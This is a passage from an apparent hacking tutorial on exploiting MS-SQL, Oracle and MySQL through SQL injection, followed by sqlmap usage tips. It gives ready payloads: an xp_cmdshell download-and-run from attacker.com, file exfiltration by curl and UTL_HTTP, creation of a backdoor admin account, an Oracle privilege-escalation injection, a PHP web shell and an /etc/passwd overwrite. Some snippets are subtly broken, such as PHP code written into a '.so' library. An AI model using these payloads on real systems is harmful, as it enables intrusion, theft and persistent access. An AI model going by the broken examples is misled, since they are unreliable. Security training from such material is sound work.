- **Creating User-Defined Functions (UDFs) for Persistence:** Some databases allow users to create custom functions. An attacker with DBA privileges can use this to re-enable disabled functionality, bypass security restrictions, or maintain persistent access to the database even after the vulnerability is patched.

A common misconception among database administrators is that authentication is enough to protect a database. They often assume that the only users interacting with the database are the trusted applications owned by their organization. However, this assumption overlooks a critical risk: if an application is vulnerable, an attacker can exploit it to interact with the database under the application’s security context.

This highlights why databases must be hardened against both external and authenticated attackers.

While database exploitation is an expansive topic beyond the scope of this cookbook, this section introduces some key attack paths across different database types. The crucial takeaway is this: every database contains mechanisms that can be leveraged for privilege escalation. Keeping systems patched and hardened can mitigate many attacks—but not all of them. For further reading, *The Database Hacker’s Handbook (Wiley, 2005)* provides an excellent deep dive into this subject.

#### MS-SQL: Exploiting Built-in System Functions:

One of the most notorious attack vectors in MS-SQL is the ```xp_cmdshell``` stored procedure, which allows users with DBA privileges to execute operating system commands directly from SQL Server, similar to running them in the cmd.exe shell.

For example, the following command executes ```ipconfig```, writing the output to ```foo.txt```:

```
EXEC master..xp_cmdshell 'ipconfig > foo.txt'
```

Explanation:

- master..xp_cmdshell → Calls the built-in stored procedure.

- ```'ipconfig > foo.txt'``` → Runs ```ipconfig```, redirecting the output to a file named ```foo.txt```.

- The file will be created in the default working directory of the SQL Server process (often ```C:\Windows\System32``` if running under ```LocalSystem```).

Overall, the potential for abuse is massive. An attacker with ```xp_cmdshell``` access can:

- Run arbitrary commands on the server.

- Pipe output to local files and read them back via SQL queries.

- Establish outbound network connections, potentially opening a reverse shell.

- Upload attack tools and execute scripts.

Because MS-SQL often runs as ```LocalSystem``` by default, successful exploitation can result in full system compromise. MS-SQL also contains other powerful extended stored procedures, such as:

- ```xp_regread``` → Reads values from the Windows Registry.

- ```xp_regwrite``` → Modifies registry keys, potentially altering system behavior.

Most modern MS-SQL installations (2005 and later) have hardened security configurations. By default:

- ```xp_cmdshell``` is disabled.

- Many extended stored procedures are locked down.

- The default SQL Server service account runs with lower privileges.

However, if the web application’s database user has high enough privileges, an attacker can re-enable ```xp_cmdshell``` and bypass these restrictions using the ```sp_configure``` procedure:

```
EXEC sp_configure 'show advanced options', 1  
RECONFIGURE WITH OVERRIDE  
EXEC sp_configure 'xp_cmdshell', 1  
RECONFIGURE WITH OVERRIDE  
```

**Additional Notes:**

Syntax here is correct, but on newer versions of SQL Server, just running ```RECONFIGURE``` is sufficient instead of ```RECONFIGURE WITH OVERRIDE```. However, using ```WITH OVERRIDE``` ensures that even restricted settings can be changed.

- ```'show advanced options', 1``` → Enables advanced configuration settings.

- ```RECONFIGURE WITH OVERRIDE``` → Applies the change immediately.

- ```'xp_cmdshell', 1``` → Enables ```xp_cmdshell```.

- ```RECONFIGURE WITH OVERRIDE``` → Ensures the setting takes effect.

Once re-enabled, the following command executes a system directory listing:

```
EXEC xp_cmdshell 'dir'
```

Beyond basic command execution, attackers often:

1. Establish a reverse shell:

```
EXEC xp_cmdshell 'powershell -c "IEX (New-Object Net.WebClient).DownloadString(''http://attacker.com/shell.ps1'')"'
```

*(Runs a malicious PowerShell script hosted externally.)*

2. Exfiltrate data over HTTP:

```
EXEC xp_cmdshell 'curl -X POST -d @C:\sensitive_data.txt http://attacker.com/upload'
```

*(Sends a file to a remote server.)*

3. Create a new administrative user:

```
EXEC xp_cmdshell 'net user backdoor P@ssw0rd! /add && net localgroup Administrators backdoor /add'
```

*(Creates a hidden user account with admin rights.)*

#### Oracle: Exploiting Built-in Vulnerabilities and Misconfigurations:

Oracle databases have historically been riddled with security vulnerabilities. If a SQL injection vulnerability allows arbitrary queries, attackers can often escalate privileges by leveraging Oracle's own stored procedures, many of which run with DBA-level privileges.

A well-known example of this existed in the ```SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES``` procedure before Oracle's July 2006 Critical Patch Update. This procedure contained a SQL injection flaw that allowed an attacker to grant themselves DBA privileges using an injected query.

Example Exploit:

```
SELECT SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(
    'INDX', 'SCH',
    'TEXTINDEXMETHODS".ODCIIndexUtilCleanup(:pl); 
    EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION; 
    BEGIN EXECUTE IMMEDIATE ''''GRANT DBA TO PUBLIC''''; END;'';',
    'CTXSYS', 1, '1', 0
) FROM dual;
```

Breakdown:

- ```DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(...)``` is a vulnerable procedure that accepts user input.

- The attacker injects an ```EXECUTE IMMEDIATE``` statement into a parameter, which executes arbitrary SQL.

- The payload ```GRANT DBA TO PUBLIC``` escalates privileges by granting DBA access to all users.

- The ```PRAGMA AUTONOMOUS_TRANSACTION``` ensures the exploit commits immediately, bypassing normal transaction controls.

- ```FROM dual``` is a standard Oracle dummy table used to execute queries that don't require actual table data.

This exploit could be injected via a SQL injection vulnerability in a web application, allowing an attacker to execute DBA-level queries through a vulnerable parameter.

Even in the absence of known vulnerabilities, Oracle contains many default packages accessible to low-privileged users, which can be abused to:

- Initiate network connections (out-of-band exploitation)

- Access the filesystem (read/write files)

- Execute OS commands via Java

Oracle provides the ```UTL_FILE``` package, which allows reading/writing files on the database server. This can be leveraged for data exfiltration or backdoor creation:

```
DECLARE
    file_handle UTL_FILE.FILE_TYPE;
BEGIN
    file_handle := UTL_FILE.FOPEN('C:\sensitive_data', 'output.txt', 'W');
    UTL_FILE.PUT_LINE(file_handle, 'Stolen credentials');
    UTL_FILE.FCLOSE(file_handle);
END;
/
```

Breakdown:

1. ```DECLARE``` Block – This initializes variables used within the ```BEGIN...END;``` block. Here, ```file_handle``` is declared as a ```UTL_FILE.FILE_TYPE```, which acts as a pointer to the file being manipulated.

2. ```UTL_FILE.FOPEN(directory, filename, mode)``` – This function opens (or creates) a file.

```'C:\sensitive_data'``` is the directory where the file is stored. However, in real Oracle databases, paths must be defined in ```UTL_FILE_DIR``` or directory objects.

```'output.txt'``` is the file name.

```'W'``` (write mode) creates a new file or overwrites an existing one.

3. ```UTL_FILE.PUT_LINE(file_handle, 'Stolen credentials');``` – Writes a line of text to the opened file.

4. ```UTL_FILE.FCLOSE(file_handle);``` – Closes the file handle to ensure changes are saved and avoid locking issues.

In 2010, David Litchfield demonstrated a method for executing OS commands on Oracle 10g R2 and 11g by abusing Java permissions. This attack exploits a flaw in ```DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY``` to grant excessive permissions, allowing the execution of arbitrary Java code.

Example Exploit:

```
EXEC DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper c:\Windows\System32\cmd.exe /c dir > c:\OUT.LST');
```

Breakdown:

- ```DBMS_JAVA.RUNJAVA``` executes a Java class inside the Oracle JVM.

- ```oracle/aurora/util/Wrapper``` is a built-in wrapper class that allows executing system commands.

- The command ```cmd.exe /c dir > c:\OUT.LST``` runs Windows ```dir``` and saves the output to ```OUT.LST```.

- This can be modified to execute malicious scripts or establish a reverse shell.

Modern Oracle databases (12c and later) have introduced several security improvements, including:

- Revoking excessive privileges from default users.

- Disabling ```DBMS_JAVA.RUNJAVA``` by default.

- Requiring explicit grants for dangerous procedures like ```UTL_FILE```.

- Stronger sandboxing for Java-based execution.

Overall, modern Oracle DBMS has a ton of security improvements, but there are still juicy misconfigurations and default functionalities attackers can leverage. Here are a few prime ones:

1. Privilege Escalation via Misconfigured Packages:

- DBMS_SQL / DBMS_SYS_SQL Abuse → These allow execution of dynamic SQL. If a user has ```EXECUTE``` privileges, they might escalate to DBA.

- ```DBMS_JAVA.RUNJAVA``` → Still a risk when Java permissions are misconfigured, leading to OS command execution.

- ```DBMS_BACKUP_RESTORE``` → Can read/write arbitrary files (often overlooked).

2. Out-of-Band Network Attacks:

- ```UTL_HTTP```, ```UTL_TCP```, ```UTL_INADDR``` → Can be used to exfiltrate data or create SSRF-style attacks.

- ```DBMS_LDAP``` → Oracle DBs often communicate via LDAP; if accessible, it can be leveraged for authentication bypass attacks.

3. File System Access:

- ```UTL_FILE``` → Still relevant but now requires directory objects.

- Oracle External Tables → Can read system files by defining tables that map to files on disk.

- Directory Traversal → Older versions had flaws where ```UTL_FILE.FOPEN``` allowed directory traversal attacks.

4. Authentication Weaknesses & Default Accounts:

- Weak SYS/SYSTEM Passwords → Default admin accounts (```SYS```, ```SYSTEM```, ```DBSNMP```, etc.) often have weak passwords.

- Roles & Grants Misconfigurations → Public roles sometimes expose critical procedures by accident.

#### Exploiting Oracle DBMS: Misconfigurations & Default Functionalities:

**Privilege Escalation via Misconfigured Packages:**

1. ```DBMS_SQL``` / ```DBMS_SYS_SQL``` Abuse:

These allow dynamic SQL execution. If a low-privileged user has ```EXECUTE``` privileges, they can escalate to DBA. Example:

```
BEGIN
    EXECUTE IMMEDIATE 'GRANT DBA TO PUBLIC';
END;
/
```

If executed under a high-privilege account, this grants DBA rights to all users.

2. ```DBMS_JAVA.RUNJAVA``` for OS Command Execution:

When Java permissions are misconfigured, attackers can execute OS commands:

```
BEGIN
    DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper c:\windows\system32\cmd.exe /c dir > c:\out.txt');
END;
/
```

3. ```DBMS_BACKUP_RESTORE``` for Arbitrary File Access:

If improperly configured, this package allows arbitrary file reading:

```
SELECT dbms_backup_restore.searchfiles('C:\sensitive_data') FROM dual;
```

**Out-of-Band Network Attacks:**

1. ```UTL_HTTP```, ```UTL_TCP```, and ```UTL_INADDR``` for SSRF & Data Exfiltration:

```
DECLARE
    req UTL_HTTP.REQ;
    resp UTL_HTTP.RESP;
BEGIN
    req := UTL_HTTP.BEGIN_REQUEST('http://attacker.com/exfil?data=stolen');
    resp := UTL_HTTP.GET_RESPONSE(req);
END;
/
```

2. ```DBMS_LDAP``` for Authentication Bypass:

If an application relies on LDAP for authentication and permissions are too broad, it can be abused to escalate privileges.

```
BEGIN
    DBMS_LDAP.INIT('malicious_ldap_server', 389);
END;
/
```

**File System Access Abuses:**

1. UTL_FILE for Arbitrary File Writing:

```
DECLARE
    file_handle UTL_FILE.FILE_TYPE;
BEGIN
    file_handle := UTL_FILE.FOPEN('C:\sensitive_data', 'output.txt', 'W');
    UTL_FILE.PUT_LINE(file_handle, 'Stolen credentials');
    UTL_FILE.FCLOSE(file_handle);
END;
/
```

2. External Tables for System File Read:

```
CREATE TABLE hack (data CLOB)
ORGANIZATION EXTERNAL
(
    TYPE ORACLE_LOADER
    DEFAULT DIRECTORY DATA_PUMP_DIR
    ACCESS PARAMETERS
    (
        RECORDS DELIMITED BY NEWLINE
        FIELDS TERMINATED BY ','
    )
    LOCATION ('C:\Windows\System32\drivers\etc\hosts')
);

SELECT * FROM hack;
```

**Authentication Weaknesses & Default Accounts:**

1. Default Admin Accounts with Weak Passwords:

Check for default accounts:

```
SELECT USERNAME FROM DBA_USERS WHERE ACCOUNT_STATUS = 'OPEN';
```

2. Misconfigured Roles and Grants:

```
SELECT * FROM DBA_TAB_PRIVS WHERE GRANTEE='PUBLIC';
```

If critical functions like ```DBMS_SQL``` are exposed to ```PUBLIC```, an attacker can escalate privileges easily.

#### MySQL Exploitation:

The ```FILE``` privilege (```FILE_PRIV```) is one of the most dangerous permissions in MySQL because it allows a user to:

- Read arbitrary files from the system using ```LOAD_FILE()```

- Write data to arbitrary locations using ```SELECT ... INTO OUTFILE```

- Create files that could lead to code execution, such as web shells in ```/var/www/html/```

Unlike standard SELECT/INSERT/UPDATE permissions, which are limited to database tables, ```FILE_PRIV``` extends control to the entire filesystem, meaning an attacker can exfiltrate sensitive files (e.g., ```/etc/passwd```), modify system configs, or even drop payloads.

By default, ```FILE_PRIV``` is granted only to root or users with explicit privileges, but misconfigurations (like overly permissive database users) can leave it exposed.

**Exploiting ```LOAD_FILE():```**

The ```LOAD_FILE()``` function lets you read arbitrary files as long as MySQL has read access to them. Example:

```
SELECT LOAD_FILE('/etc/passwd');
```

- If MySQL is running with root privileges, this reveals system user accounts.

- If running on Windows, attackers might try ```C:\\Windows\\win.ini``` to check access.

- Mitigation: Ensure ```secure_file_priv``` is set to a restricted directory (```NULL``` to disable).

**Exploiting ```SELECT ... INTO OUTFILE```:**

The ```SELECT ... INTO OUTFILE``` command writes data to the filesystem. This can be abused to create arbitrary files, including PHP web shells for remote code execution. Example:

```
SELECT '<?php system($_GET["cmd"]); ?>' 
INTO OUTFILE '/var/www/html/shell.php';
```

Now, the attacker can visit ```http://victim.com/shell.php?cmd=whoami``` to execute commands!

Example for Linux privilege escalation by modifying system files:

```
CREATE TABLE test (data VARCHAR(200));
INSERT INTO test (data) VALUES ('hacker:Azm123123::0:0::/root:/bin/bash');
SELECT * FROM test INTO OUTFILE '/etc/passwd';
```

Notes:

- This creates a table named ```test``` with a single column called ```data```.

- ```VARCHAR(200)``` means the column can store up to 200 characters of variable-length text.

- Unlike ```CHAR(200)```, which always stores 200 characters (even if unused), ```VARCHAR(200)``` only uses as much space as needed, plus a small overhead because the attacker needs a flexible text field to store an entire fake ```/etc/passwd``` entry (and ```200``` is more than enough for a single user entry).

The key to this trick is misusing ```VARCHAR(200)``` to store an entire user entry in one row, then exporting it to overwrite critical system files. And boom, user added to ```/etc/passwd``` with root access. Possible mitigations:

- Set ```secure_file_priv``` to ```NULL``` (```SHOW VARIABLES LIKE 'secure_file_priv'```)

- Disable ```FILE_PRIV``` for untrusted users

**User-Defined Functions (UDFs) for Code Execution:**

MySQL allows creating custom functions in C and loading them as shared libraries (```.so``` or ```.dll```). This means an attacker with ```FILE_PRIV``` can drop a malicious UDF library and execute OS commands via SQL.

Attacker Drops a Malicious UDF File:

```
SELECT '<?php system($_GET["cmd"]); ?>' 
INTO DUMPFILE '/usr/lib/mysql/plugin/hack.so';
```

Attacker Registers the UDF in MySQL:

```
CREATE FUNCTION my_exec RETURNS STRING SONAME 'hack.so';
```

Attacker Executes OS Commands:

```
SELECT my_exec('whoami');
```

So, this means OS control. Possible mitigations:

-  Restrict ```FILE_PRIV``` and ```super``` privileges

- Monitor plugin directory for unauthorized files

-  Ensure MySQL runs with low-privileged user accounts

MySQL might seem more limited compared to MSSQL or Oracle, but it still has dangerous functionalities if misconfigured. Attackers love ```FILE_PRIV``` abuse because it allows direct file access, which is often overlooked by sysadmins.

### Using SQL Exploitation Tools:

Many of the techniques for exploiting SQL injection vulnerabilities require making numerous requests to extract small amounts of data at a time. Fortunately, several tools can automate this process while adapting to database-specific syntax for maximum effectiveness.

Most modern SQL exploitation tools follow this general methodology:

1. Identify SQL Injection Points:

- Brute-force all parameters in the target request to locate vulnerabilities.

2. Analyze Query Structure:

- Determine where the injection occurs by appending characters like ```')```, ```--```, or ```/**/``` to trigger errors or confirm query manipulation.

3. Perform a UNION-Based Attack:

- Brute-force the number of columns needed for a ```UNION SELECT``` attack.

- Locate a column that supports the ```VARCHAR``` data type (to return readable output).

4. Retrieve Arbitrary Data:

- Inject custom queries to extract sensitive information.

- If needed, concatenate multiple columns into a single result for extraction.

5. Use Boolean-Based SQL Injection:

- If ```UNION SELECT``` is not viable, inject Boolean expressions (```AND 1=1```, ```AND 1=2```, etc.) to infer data based on the application’s responses.

6. Use Time-Based SQL Injection:

- If no visible errors or responses are returned, inject time delays (e.g., ```SLEEP(5)```, ```WAITFOR DELAY '00:00:05'```) to confirm injection points and extract data.

7. Query Metadata Tables:

- Most tools extract database structure details (tables, columns, users) from system metadata tables (```INFORMATION_SCHEMA``` for MySQL, ```sys.tables``` for SQL Server, etc.).

- If privileged functions (e.g., ```xp_cmdshell``` in SQL Server) are accessible, the tool may escalate privileges to OS-level command execution.

8. Evade Filters and Optimize Attacks:

- Tools use built-in obfuscation techniques (e.g., encoding, comment injection, case-alternation) to bypass WAFs and other security filters. They also minimize the number of requests needed for inference-based brute-force extraction.

Key Points:

- These tools are not a magic bullet—they work best when the injection point is already identified and understood.

- Manual input might still be needed to refine SQL syntax for specific database types.

- Proper filtering, parameterized queries, and least privilege access significantly reduce their effectiveness.

### SQL Injection Exploitation Tips:

When you have identified a SQL injection vulnerability using the techniques described earlier in this chapter, you can leverage SQL injection tools to exploit the vulnerability and retrieve valuable data. This is especially useful for blind SQL injection scenarios where data must be retrieved incrementally.

1. Running SQL Exploitation Tools Through an Intercepting Proxy:

Before running automated SQL injection tools like ```sqlmap```, it is beneficial to route their traffic through an intercepting proxy (e.g., Burp Suite). This allows you to:

- Inspect the exact requests being sent.

- Analyze the application's responses.

- Enable verbose output to correlate the tool's actions with observed queries and responses.

**Notes:**

- To send sqlmap requests through Burp Suite, the simplest way is to configure sqlmap to use Burp's proxy.

- Open Burp Suite. Go to Proxy > Options and ensure your listener is set on ```127.0.0.1:8080``` (default).

- Use the ```--proxy``` flag to send sqlmap traffic through Burp:

```
sqlmap -u "http://target.com/vuln.php?id=1" --proxy=http://127.0.0.1:8080
```

- Open the HTTP history tab in Burp’s Proxy section. You will see sqlmap’s automated requests flowing through, allowing you to inspect and manipulate them. This method is useful for debugging sqlmap's behavior and ensuring that it is sending requests correctly.

Typically, manual probing with Burp Suite or other methods is performed first to confirm an injection vulnerability. However, running sqlmap through a proxy can help analyze how the tool interacts with the target application, making it easier to debug issues and refine payloads.

2. Adjusting Input to Ensure Proper Execution:

SQL injection tools rely on predefined test cases and expected response syntax. To ensure successful execution, you may need to modify the injected string to:

- Add a comment character (```--```, ```#```) to terminate unwanted portions of the query.

- Balance single quotes (```'```) within the server's SQL query.

- Append or prepend necessary brackets to match the query's structure.

Example:

If an application executes the following vulnerable query:

```
SELECT * FROM users WHERE username = 'admin' AND password = '[input]';
```

You may need to inject:

```
' OR '1'='1' --
```

This effectively turns the query into:

```
SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1' --';
```

which always evaluates to true.

3. Using Nested Subqueries for Better Control:

If standard syntax fails, injecting into a nested subquery can provide more control over inference-based data extraction. This method works well when injecting into ```SELECT``` and ```UPDATE``` queries, and under Oracle, it can be used within ```INSERT``` statements. Examples:

- Oracle:

```
(SELECT 1 FROM dual WHERE 1=[input])
```

- MS-SQL:

```
(SELECT 1 WHERE 1=[input])
```

4. Leveraging SQLMap for Automated Exploitation:

```sqlmap``` is a powerful tool for automating SQL injection attacks. It supports:

- UNION-based and blind inference-based retrieval.

- File retrieval from the operating system.

- Command execution on Windows using ```xp_cmdshell```.

One of the most effective ways to use ```sqlmap``` is via the ```--sql-shell``` option, which provides an interactive SQL prompt while handling injection mechanisms behind the scenes. Example Usage:

```
sqlmap.py -u "http://wahh-app.com/employees?Empno=7369" --union-use --sql-shell -p Empno
```

Sample Output:

```
[*] Starting at: 14:54:39
[INFO] Testing connection to the target URL
[INFO] Testing SQL injection on GET parameter 'Empno'
[INFO] Parameter 'Empno' is vulnerable to SQL injection
[INFO] Backend DBMS detected: Oracle
[INFO] Calling Oracle shell. To quit, type 'x' or 'q' and press ENTER

sql-shell> SELECT banner FROM v$version;
Do you want to retrieve the SQL statement output? [Y/n]
[INFO] Fetching output:
[*] CORE 9.2.0.1.0 Production
[*] NLSRTL Version 9.2.0.1.0 - Production
[*] Oracle9i Enterprise Edition Release 9.2.0.1.0 - Production
```
